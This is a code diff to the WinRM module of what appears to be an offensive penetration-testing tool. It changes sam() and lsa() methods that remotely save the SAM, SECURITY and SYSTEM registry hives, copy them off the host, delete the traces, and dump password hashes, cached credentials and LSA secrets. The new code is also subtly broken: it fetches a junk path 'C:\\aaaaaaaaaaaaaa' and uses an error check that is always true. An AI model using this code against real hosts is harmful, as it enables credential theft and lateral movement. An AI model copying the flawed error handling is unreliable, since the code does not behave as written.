@@ -347,36 +347,49 @@ class winrm(connection):
         self.execute(payload=self.args.ps_execute, get_output=True, shell_type="powershell")
 
     def sam(self):
-        self.conn.execute_cmd("reg save HKLM\SAM C:\\windows\\temp\\SAM && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM")
-        self.conn.fetch("C:\\windows\\temp\\SAM", self.output_filename + ".sam")
-        self.conn.fetch("C:\\windows\\temp\\SYSTEM", self.output_filename + ".system")
-        self.conn.execute_cmd("del C:\\windows\\temp\\SAM && del C:\\windows\\temp\\SYSTEM")
-
-        local_operations = LocalOperations(f"{self.output_filename}.system")
-        boot_key = local_operations.getBootKey()
-        SAM = SAMHashes(
-            f"{self.output_filename}.sam",
-            boot_key,
-            isRemote=None,
-            perSecretCallback=lambda secret: self.logger.highlight(secret),
-        )
-        SAM.dump()
-        SAM.export(f"{self.output_filename}.sam")
+        try:
+            self.execute("reg save HKLM\SAM C:\\windows\\temp\\SAM && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM", False)
+            self.conn.fetch("C:\\aaaaaaaaaaaaaa", self.output_filename + ".sam")
+            self.conn.fetch("C:\\windows\\temp\\SAM", self.output_filename + ".sam")
+            self.conn.fetch("C:\\windows\\temp\\SYSTEM", self.output_filename + ".system")
+            self.execute("del C:\\windows\\temp\\SAM && del C:\\windows\\temp\\SYSTEM", False)
+        except Exception as e:
+            if "does not exist" or "TransformFinalBlock" in e:
+                self.logger.fail("Failed to dump SAM hashes, maybe got blocked by AV softwares or current user is not privileged user")
+            else:
+                self.logger.fail(e)
+        else:
+            local_operations = LocalOperations(f"{self.output_filename}.system")
+            boot_key = local_operations.getBootKey()
+            SAM = SAMHashes(
+                f"{self.output_filename}.sam",
+                boot_key,
+                isRemote=None,
+                perSecretCallback=lambda secret: self.logger.highlight(secret),
+            )
+            SAM.dump()
+            SAM.export(f"{self.output_filename}.sam")
 
     def lsa(self):
-        self.conn.execute_cmd("reg save HKLM\SECURITY C:\\windows\\temp\\SECURITY && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM")
-        self.conn.fetch("C:\\windows\\temp\\SECURITY", f"{self.output_filename}.security")
-        self.conn.fetch("C:\\windows\\temp\\SYSTEM", f"{self.output_filename}.system")
-        self.conn.execute_cmd("del C:\\windows\\temp\\SYSTEM && del C:\\windows\\temp\\SECURITY")
-
-        local_operations = LocalOperations(f"{self.output_filename}.system")
-        boot_key = local_operations.getBootKey()
-        LSA = LSASecrets(
-            f"{self.output_filename}.security",
-            boot_key,
-            None,
-            isRemote=None,
-            perSecretCallback=lambda secret_type, secret: self.logger.highlight(secret),
-        )
-        LSA.dumpCachedHashes()
-        LSA.dumpSecrets()
+        try:
+            self.execute("reg save HKLM\SECURITY C:\\windows\\temp\\SECURITY && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM", False)
+            self.conn.fetch("C:\\windows\\temp\\SECURITY", f"{self.output_filename}.security")
+            self.conn.fetch("C:\\windows\\temp\\SYSTEM", f"{self.output_filename}.system")
+            self.execute("del C:\\windows\\temp\\SYSTEM && del C:\\windows\\temp\\SECURITY", False)
+        except Exception as e:
+            if "does not exist" or "TransformFinalBlock" in e:
+                self.logger.fail("Failed to dump LSA secrets, maybe got blocked by AV softwares or current user is not privileged user")
+            else:
+                self.logger.fail(e)
+        else:
+            local_operations = LocalOperations(f"{self.output_filename}.system")
+            boot_key = local_operations.getBootKey()
+            LSA = LSASecrets(
+                f"{self.output_filename}.security",
+                boot_key,
+                None,
+                isRemote=None,
+                perSecretCallback=lambda secret_type, secret: self.logger.highlight(secret),
+            )
+            LSA.dumpCachedHashes()
+            LSA.dumpSecrets()
